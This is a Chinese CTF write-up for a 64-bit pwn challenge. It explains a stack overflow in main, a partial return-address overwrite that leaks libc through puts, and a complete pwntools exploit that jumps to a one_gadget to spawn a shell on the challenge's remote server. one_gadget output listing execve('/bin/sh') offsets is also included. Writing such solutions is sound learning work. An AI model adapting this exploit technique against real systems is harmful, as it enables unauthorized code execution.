# PWN4

这个题没有给libc文件，这是出题人的失误，库版本应该是libc6_2.27-3ubuntu1.2_amd64。

## checksec

```shell
[*] '/home/giantbranch/Desktop/Untitled Folder/pwn'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

## ida

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char buf; // [rsp+0h] [rbp-20h]

  myinit(*(_QWORD *)&argc, argv, envp);
  read(0, &buf, 0x64uLL);
  puts(&buf);
  return 0;
}
```

在主函数中进行栈溢出，main函数最后返回的是_libc_start_main函数，所以通过研究库文件覆盖其低三位为“\x90”,就可以再次回到main，而puts函数会把地址输出，依次来泄露libc基址。

```assembly
.text:0000000000021B90                 mov     rax, [rsp+0B8h+var_A0]
.text:0000000000021B95                 call    rax
```

## exp

```python
from pwn import *
from LibcSearcher import LibcSearcher
context.log_level="DEBUG"
context.arch="amd64"

#p=process('./pwn')
p=remote('chive.vaala.cloud',28083)
elf = ELF('./pwn')
#libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc=ELF('./libc-2.27.so')

onegadget=0x4f2c5
#0x4f2c5
#0x10a38c
payload='a'*0x20+'a'*8+'\x90'
p.send(payload)
p.recvuntil('a'*40)
ret=u64(p.recv(6).ljust(8, '\x00'))
libcbase=ret+7-231-libc.symbols['__libc_start_main']
print hex(libcbase)

gadget=libcbase+onegadget
sleep(0.5)

payload='a'*0x20+'a'*8+p64(gadget)
p.send(payload)

p.interactive()
```

这里只能使用onegadget，因为puts遇到“\x00”会截断。onegadget可以用脚本自动寻找,例如：

```shell
giantbranch@ubuntu:/lib/x86_64-linux-gnu$ one_gadget -f libc.so.6 
0x45226	execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4527a	execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf0364	execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1207	execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
```

在这个目录下有一些库：`/lib/x86_64-linux-gnu/`，不过能用到的比较少。